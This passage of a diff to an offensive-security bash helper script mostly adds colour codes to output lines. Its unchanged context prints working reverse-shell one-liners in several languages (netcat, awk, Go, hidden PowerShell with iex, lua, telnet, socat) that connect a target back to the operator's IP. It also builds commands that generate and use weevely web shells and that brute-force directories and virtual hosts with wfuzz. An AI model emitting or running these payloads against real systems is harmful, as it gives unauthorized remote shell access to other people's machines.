     "nc"|"ncat"|"netcat")           echo "nc -e /bin/sh $(getIP) $PORT" ;;
-    "awk")                          echo -e "[*] WARNING: This shell is NOT upgradeable!\n"; echo "awk 'BEGIN {s=\"/inet/tcp/0/$(getIP)/$PORT\";while(42){do{printf \"shell> \"|& s;s|& getline c; if(c){while((c|& getline)>0) print \$0|& s;close(c);}} while(c!=\"exit\") close(s);}}' /dev/null" ;;
+    "awk")                          echo -e "${info} WARNING: This shell is NOT upgradeable!\n"; echo "awk 'BEGIN {s=\"/inet/tcp/0/$(getIP)/$PORT\";while(42){do{printf \"shell> \"|& s;s|& getline c; if(c){while((c|& getline)>0) print \$0|& s;close(c);}} while(c!=\"exit\") close(s);}}' /dev/null" ;;
     "go"|"golang")                  echo "echo 'package main;import\"os/exec\";import\"net\";func main(){c,_:=net.Dial(\"tcp\",\"$(getIP):$PORT\");cmd:=exec.Command(\"/bin/sh\");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}' > /tmp/t.go && go run /tmp/t.go && rm /tmp/t.go" ;;
     "ps"|"psh"|"powershell"|"pwsh") echo "powershell -NoP -NonI -W Hidden -Exec Bypass -c \"\$a=New-Object System.Net.Sockets.TCPClient('$(getIP)',$PORT);\$b=\$a.GetStream();[byte[]]\$d=0..65535|%{0};while((\$e=\$b.Read(\$d,0,\$d.Length)) -ne 0){;\$i=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$d,0,\$e);\$k=(iex \$i 2>&1|Out-String);\$m=\$k+'PS '+(pwd).Path+'> ';\$o=([text.encoding]::ASCII).GetBytes(\$m);\$b.Write(\$o,0,\$o.Length);\$b.Flush()};\$a.Close()\"" ;;
     "lua")                          echo -e "# Linux (tested with lua5.3):\nlua -e \"require('os');s=require('socket');s.tcp();s.connect('$(getIP)','$PORT');os.execute('/bin/sh -i <&3 >&3 2>&3')" ;;
     "telnet")                       echo "rm -f /tmp/p; mknod /tmp/p p && telnet $(getIP) $PORT 0/tmp/p" ;;
     "socat")                        echo "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$(getIP):$PORT" ;;
-    *)                              echo "[!] Unknown revshell type!" ;;
+    *)                              echo "${warn} Unknown revshell type!" ;;
   esac
   echo
   exit
@@ -1018,7 +1038,7 @@ if [ "$1" == "rpc" ] || [ "$1" == "rpcclient" ]; then
   fi
 
   CMD="$CMD $WRKGRP $RHOST $CMND"
-  echo "> $CMD"
+  echo "${bldwht}> $CMD${txtrst}"
   prompt
   bash -c "$CMD"
   exit
@@ -1041,7 +1061,7 @@ if [ "$1" == "smbpasswd" ]; then
 
   CMD="$CMD -r $RHOST -U $USRNME"
   echo "Password: $PASSWD"
-  echo "> $CMD"
+  echo "${bldwht}> $CMD${txtrst}"
   prompt
   bash -c "$CMD"
   exit
@@ -1059,7 +1079,7 @@ if [ "$1" == "socat" ]; then
   # https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/
   echo "> Run this on your target:"
   echo -e "   socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:$(getIP):$PORT\n"
-  echo "> $CMD"
+  echo "${bldwht}> $CMD${txtrst}"
   bash -c "$CMD"
   exit
 fi
@@ -1090,7 +1110,7 @@ if [ "$1" == "ssh" ]; then
     CMD="$CMD -p $PORT"
   fi
 
-  echo "> $CMD"
+  echo "${bldwht}> $CMD${txtrst}"
   bash -c "$CMD"
   exit
 fi
@@ -1131,7 +1151,7 @@ if [ "$1" == "weevely" ] && [ "$#" -ge 2 ] && [ "$2" == "gen" ]; then
     PASSWD="$4"
   fi
   CMD="$CMD generate $PASSWD $FILE"
-  echo "> $CMD"
+  echo "${bldwht}> $CMD${txtrst}"
   prompt
   bash -c "$CMD"
   exit
@@ -1170,7 +1190,7 @@ if [ "$1" == "weevely" ]; then
   fi
   getMachinePass
   CMD="$CMD $PROTO://${RHOST}${SUBDIR}${FILE} $PASSWD"
-  echo "> $CMD"
+  echo "${bldwht}> $CMD${txtrst}"
   prompt
   bash -c "$CMD"
   exit
@@ -1220,7 +1240,7 @@ if [ "$1" == "wfuzz" ] && [ "$2" == "vhost" ]; then
 
   CMD="wfuzz -H 'Host: FUZZ.$DOMAIN' -u '$PROTO://$RHOST' -w $FPATH/subdomains-top1million-20000.txt $HW $HC"
   CMD="$CMD | tee ${RHOST}_$(echo "$CMD" | cut -d' ' -f1)_vhost_$(date +%F_%H%M%S).log"
-  echo "> $CMD"
+  echo "${bldwht}> $CMD${txtrst}"
   prompt
   bash -c "$CMD"
   rm -rf "$FPATH"
@@ -1253,7 +1273,7 @@ if [ "$1" == "wfuzz" ] && [ "$2" != "vhost" ]; then
 
   CMD="wfuzz -u '$PROTO://${RHOST}${SUB}' -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt $HW $HC"
   CMD="$CMD | tee ${RHOST}_$(echo "$CMD" | cut -d' ' -f1)_$(date +%F_%H%M%S).log"
-  echo "> $CMD"
+  echo "${bldwht}> $CMD${txtrst}"
   prompt
   bash -c "$CMD"
   rm -rf "$FPATH"
